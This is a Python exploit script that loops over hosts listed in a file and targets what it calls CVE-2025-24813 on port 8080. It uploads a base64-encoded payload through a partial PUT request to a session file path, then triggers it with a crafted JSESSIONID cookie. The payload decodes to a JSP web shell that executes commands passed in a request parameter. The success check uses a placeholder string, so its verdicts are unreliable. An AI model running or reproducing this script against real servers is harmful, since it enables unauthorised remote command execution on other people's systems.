import requests
import base64
import os

# Paste your base64 payload here
b64_encoded_payload = "PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU+CjwlCiAgICBTdHJpbmcgY21kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpOwogICAgaWYgKGNtZCAhPSBudWxsKSB7CiAgICAgICAgUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhjbWQpOwogICAgICAgIE91dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICAgICAgSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGM7CiAgICAgICAgd2hpbGUgKChjID0gaW4ucmVhZCgpKSAhPSAtMSkgewogICAgICAgICAgICBvdXQucHJpbnQoKGNoYXIpYyk7CiAgICAgICAgfQogICAgICAgIGluLmNsb3NlKCk7CiAgICB9CiU+Cg=="
output_file_path = "testfile.txt"
# Decode the payload
# Note: Ensure the payload is safe to decode and execute
# This is a placeholder for the payload. In practice, you would use a safe payload.

# Decode payload once
decoded_content = base64.b64decode(b64_encoded_payload)

# Read target IPs/hosts from file
with open("hosts.txt", "r") as file:
    targets = [line.strip() for line in file if line.strip()]

for target in targets:
    target_url = f"http://{target}:8080"  # Assumes HTTP, port 8080

    try:
        # Write the payload to file
        with open(output_file_path, "wb") as f:
            f.write(decoded_content)

        # PUT request
        put_url = f"{target_url}/gopan.session"
        put_headers = {"Content-Range": "bytes 0-5/100"}

        with open(output_file_path, "rb") as f:
            put_response = requests.put(put_url, data=f, headers=put_headers, timeout=5)

        # GET request to check response
        get_url = f"{target_url}/"
        get_headers = {"Cookie": "JSESSIONID=.gopan"}
        get_response = requests.get(get_url, headers=get_headers, timeout=5)

        print(f"[+] {target}: PUT Status {put_response.status_code}, GET Status {get_response.status_code}")
        if get_response.status_code == 200 and "some-indicator-of-success" in get_response.text:
            print(f"    [!] Possible CVE-2025-24813 exploitation indicator found on {target}")
        else:
            print(f"    [-] No clear indication of exploit on {target}")

    except requests.exceptions.RequestException as e:
        print(f"[!] {target}: Error communicating - {e}")

    finally:
        if os.path.exists(output_file_path):
            os.remove(output_file_path)